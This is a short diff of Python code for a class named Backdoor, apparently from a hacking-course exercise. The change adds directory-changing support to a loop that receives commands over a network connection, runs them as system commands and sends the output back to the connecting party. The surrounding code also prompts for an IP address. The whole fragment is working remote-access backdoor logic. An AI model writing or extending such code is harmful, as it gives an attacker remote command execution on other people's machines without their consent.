@@ -42,9 +42,12 @@ class Backdoor:
                 #this works because data is sent as json object and unpacked first; receives var command as list
                 self.connection.close()
                 exit()
-            command_result = self.execute_system_command(command) #specify SELF.function -
-            #need to specify self since calling function from within class
-            #self.connection.send(command_result)
+            elif command[0] == "cd" and len(command) > 1:
+                command_result = self.change_working_directory_to(command[1])
+            else:
+                command_result = self.execute_system_command(command) #specify SELF.function -
+                #need to specify self since calling function from within class
+                #self.connection.send(command_result)
             self.reliable_send(command_result)
     
 ip = raw_input("Enter IP Address: ")
